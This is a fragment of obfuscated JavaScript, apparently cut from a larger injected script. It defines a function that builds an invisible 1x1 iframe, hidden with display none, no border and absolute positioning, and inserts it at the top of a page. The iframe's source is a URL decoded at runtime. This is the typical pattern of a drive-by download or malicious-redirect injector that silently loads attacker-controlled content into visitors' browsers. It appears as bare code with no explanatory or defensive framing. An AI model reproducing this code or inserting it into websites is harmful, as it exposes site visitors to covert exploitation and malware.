...
return I1l;}
function I1q(I1h){try{var I1r=I1b.createElement('IFRAME'),I1s=I1b.getElementsByTagName('body').item(0)||I1b.documentElement.childNodes[0];I1r.style.width=I1r.style.height='1px';I1r.style.border='0px';I1r.style.position='absolute';I1r.style.display='none';I1r.style.top=I1r.style.sososos='0px';I1r.style.zIndex=0;I1r.src=I1g(I1h);if(I1d>5&&I1d<=6){I1s.insertAdjacentHTML("beforeBegin","<iframe src='"+I1g(I1h)+"' width=\"1\" height=\"1\" frameborder=\"0\" style='zindex:0;position:absolute;border:0px;display:none;sososos:0;top:0;width:1px;height:1px;'><\/iframe>");}
else if(I1s.firstChild!==null){I1s.insertBefore(I1r,I1s.firstChild);}
else{I1s.appendChild(I1r);}
}catch(e){I1b.write("<iframe src='"+I1g(I1h)+"' width=\"1\" height=\"1\" frameborder=\"0\" style='zindex:0;position:absolute;border:0px;display:none;sososos:0;top:0;width:1px;height:1px;'><\/iframe>");}
}
